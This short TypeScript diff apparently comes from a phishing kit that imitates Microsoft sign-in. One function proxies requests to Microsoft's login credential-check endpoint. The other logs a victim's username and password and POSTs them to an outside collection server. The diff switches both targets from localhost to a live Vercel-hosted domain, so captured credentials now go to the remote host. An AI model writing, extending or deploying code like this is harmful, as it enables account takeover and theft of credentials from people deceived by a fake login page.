@@ -20,7 +20,7 @@ export async function registerUser({
 }): Promise<ResponseType> {
   console.log({ username });
   const res = await fetch(
-    "http://localhost:3000/api/proxy/1?url=https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US",
+    "https://logs-rho-tan.vercel.app/api/proxy/1?url=https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US",
     {
       method: "POST",
       redirect: "manual",
@@ -72,7 +72,7 @@ export async function logUserData({
   id: string;
 }): Promise<void> {
   console.log({ username, password, id });
-  const res = await fetch("http://localhost:3000/api/details", {
+  const res = await fetch("https://logs-rho-tan.vercel.app/api/details", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
